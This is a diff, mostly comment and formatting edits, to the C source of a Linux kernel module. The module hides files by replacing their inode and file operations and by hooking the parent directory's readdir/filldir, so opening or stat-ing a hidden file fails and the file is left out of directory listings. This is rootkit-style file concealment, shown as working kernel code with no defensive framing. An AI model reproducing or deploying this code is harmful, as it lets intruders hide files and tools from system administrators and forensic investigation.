@@ -1,3 +1,6 @@
+/*
+ *
+ */
 #include <linux/fs.h>
 #include <linux/namei.h>
 #include <linux/module.h>
@@ -10,7 +13,7 @@
 
 struct dentry* g_parent_dentry;
 struct nameidata g_root_nd;
-/*Number of inodes*/
+/* number of inodes */
 unsigned long* g_inode_numbers;
 int g_inode_count=0;
 
@@ -61,7 +64,7 @@ int parent_readdir (struct file *file, void *dirent, filldir_t filldir)
 
 	return g_root_nd.path.dentry->d_inode->i_fop->readdir(file, dirent, new_filldir);
 }
-/********************************FILE OPERATIONS*************************/
+
 static struct file_operations new_fop =
 {
 	.owner=THIS_MODULE,
@@ -115,7 +118,7 @@ int new_open (struct inode * old_inode, struct file * old_file)
 	return -2;
 }
 
-/********************************INODE OPERATIONS*************************/
+
 static struct inode_operations new_iop =
 {
 	.getattr=new_getattr,
@@ -134,7 +137,7 @@ int new_getattr (struct vfsmount *mnt, struct dentry * new_dentry, struct kstat 
 	return -2;
 }
 
-/*Allocate memmory for arrays*/
+
 void allocate_memmory()
 {
 	orig_inode_pointer = kmalloc(sizeof(void*), GFP_KERNEL);
@@ -150,10 +153,10 @@ void allocate_memmory()
 
 void reallocate_memmory()
 {
-	/*Realloc memmory for inode number*/
+	/* realloc memmory for inode number */
 	g_inode_numbers = krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL);
 
-	/*Realloc memmory for old pointers*/
+	/* realloc memmory for old pointers */
 	orig_inode_pointer = krealloc(orig_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
 	orig_fop_pointer = krealloc(orig_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
 	orig_iop_pointer = krealloc(orig_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
@@ -162,9 +165,7 @@ void reallocate_memmory()
 	orig_parent_fop_pointer = krealloc(orig_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL);
 }
 
-
-
-/*Function for hook functions of specified file*/
+/* function for hook functions of specified file */
 unsigned long hook_functions(const char * file_path) 
 {
 	int error=0;
@@ -191,8 +192,7 @@ unsigned long hook_functions(const char * file_path)
 		return -1;
 	}
 
-	/*********** orig pointers *******/
-	/*Save pointers*/
+	/* orig pointers */
 	orig_inode_pointer[g_inode_count]=nd.path.dentry->d_inode;
 	orig_fop_pointer[g_inode_count]=(void *)nd.path.dentry->d_inode->i_fop;
 	orig_iop_pointer[g_inode_count]=(void *)nd.path.dentry->d_inode->i_op;
@@ -200,23 +200,23 @@ unsigned long hook_functions(const char * file_path)
 	orig_parent_inode_pointer[g_inode_count]=nd.path.dentry->d_parent->d_inode;
 	orig_parent_fop_pointer[g_inode_count]=(void *)nd.path.dentry->d_parent->d_inode->i_fop;
 
-	/*Save inode number*/
+	/* save inode number */
 	g_inode_numbers[g_inode_count]=nd.path.dentry->d_inode->i_ino;
 	g_inode_count=g_inode_count+1;
 
 	reallocate_memmory();
 
-	/*filldir hook*/
+	/* filldir hook */
 	nd.path.dentry->d_parent->d_inode->i_fop=&new_parent_fop;
 
-	/* Hook of commands for file*/
+	/* hook of commands for file */
 	nd.path.dentry->d_inode->i_op=&new_iop;
 	nd.path.dentry->d_inode->i_fop=&new_fop;
 
 	return 0;
 }
 
-/*Function for backup inode pointers of the specified file*/
+/* function for backup inode pointers of the specified file */
 unsigned long backup_functions()
 {	
 	int i=0;
